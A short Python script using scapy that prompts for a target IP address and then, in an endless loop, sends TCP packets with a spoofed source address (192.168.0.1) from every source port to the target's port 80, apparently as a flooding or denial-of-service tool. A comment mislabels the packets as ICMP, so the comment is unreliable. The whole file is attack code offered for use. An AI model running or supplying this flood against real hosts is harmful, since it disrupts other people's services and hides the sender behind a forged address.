import random
import time
from scapy.all import *


#To give input of target IP
target_IP = input("Enter IP address of Target: ")

#Condition to send ICMP packets using all ports
while True:   
    for source_port in range(1,65535):
        IP1 = IP(src= "192.168.0.1", dst= target_IP)
        TCP1 = TCP(sport = source_port, dport = 80)
        pkt = IP1 / TCP1
        send(pkt,inter = .10)
       
